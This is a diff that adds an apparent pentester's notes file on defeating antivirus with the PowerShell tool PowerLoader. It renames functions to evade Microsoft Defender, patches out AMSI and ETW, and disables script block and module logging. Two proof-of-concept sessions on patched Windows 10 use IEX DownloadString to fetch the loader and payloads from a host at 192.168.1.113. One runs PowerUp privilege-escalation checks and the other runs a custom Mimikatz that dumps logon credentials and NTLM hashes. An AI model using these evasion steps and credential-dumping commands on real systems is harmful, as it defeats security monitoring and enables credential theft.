@@ -1,0 +1,178 @@
+=========================================================================================================================================
+AV bypass using the tool 'PowerLoader'
+=========================================================================================================================================
+
+=> Source: https://github.com/tmenochet/PowerExec/blob/master/PowerLoader.ps1
+
+The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory:
+> PowerShell script, 
+> .NET assembly,
+> shellcode.
+
+Several bypass techniques can be specified with the '-bypass' parameter within the function New-PowerLoader:
+> AMSI	-  Bypass Antimalware Scan Interface via in-memory patching
+> ETW 	-  Bypass Event Tracing for Windows via in-memory patching
+> SBL 	-  Disable PowerShell Script Block Logging
+> PML 	-  Disable PowerShell Module Logging
+
+Note: To avoid basic detection from the Windows Defender AV, I renamed:
+      > the script name by 'PowerLoaderCustom.ps1'
+      > the main function name by 'New-PowerLoader-Custom'
+      > the parameter 'AMSI' by 'AntiMSI'
+
+
+================================================================================================================================
+PoC 1 - Example with the script 'PowerUp.ps1' loaded with 'PowerLoader' on a Windows 10 laptop fully patched with the Microsoft 
+        Defender AV enabled and up-to-date
+================================================================================================================================
+
+
+C:\Users\pentester>net user pentester
+User name                    pentester
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            22/12/2022 01:59:23
+Password expires             20/06/2023 01:59:23
+Password changeable          22/12/2022 01:59:23
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   22/12/2022 02:00:06
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+The command completed successfully.
+
+
+C:\Users\pentester>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\pentester> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\pentester> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/PowerLoaderCustom.ps1');
+
+PS C:\Users\pentester> $payload0 = New-PowerLoader-Custom -Type PoSh -FileUrl "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1" 
+                       -ArgumentList 'Invoke-Allchecks' -Bypass AntiMSI,PML,SBL,ETW
+
+PS C:\Users\pentester> invoke-command -scriptblock $payload0
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[*] Checking for unquoted service paths...
+[*] Checking service executable and argument permissions...
+[*] Checking service permissions...
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+HijackablePath : C:\Python27\
+AbuseFunction  : Write-HijackDll -OutputFile 'C:\Python27\\wlbsctrl.dll' -Command '...'
+
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+[*] Checking for vulnerable registry autoruns and configs...
+[*] Checking for vulnerable schtask files/configs...
+[*] Checking for unattended install files...
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+<SNIP>
+
+=============================================================================================================================================
+PoC 2 - Example with the script 'Invoke-mimkatz.ps1' (custom version) loaded with 'PowerLoader' on a Windows 10 laptop fully patched 
+        and with the Microsoft Defender AV enabled and up-to-date
+=============================================================================================================================================
+
+C:\Users\Administrator\Desktop>powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator\Desktop> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\Administrator\Desktop> . .\PowerLoaderCustom.ps1
+
+PS C:\Users\Administrator\Desktop> $payload0 = New-PowerLoader-Custom -Type PoSh -FileUrl "http://192.168.1.113:8081/Invoke-Mimi-Custom.ps1" -ArgumentList 'Invoke-Mimi-Custom' 
+                                   -Bypass AntiMSI,PML,SBL,ETW
+
+PS C:\Users\Administrator\Desktop> amsiscanbuffer
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS C:\Users\Administrator\Desktop> invoke-command -scriptblock $payload0
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 97707473 (00000000:05d2e5d1)
+Session           : Interactive from 3
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 21/12/2022 22:42:34
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678e11<SNIP>
+         * SHA1     : d5feabcececab0e16c2cbb3917<SNIP>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <SNIP>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+        
+<SNIP>
+
+PS C:\Users\Administrator\Desktop> amsiscanbuffer
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a
+path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+
+
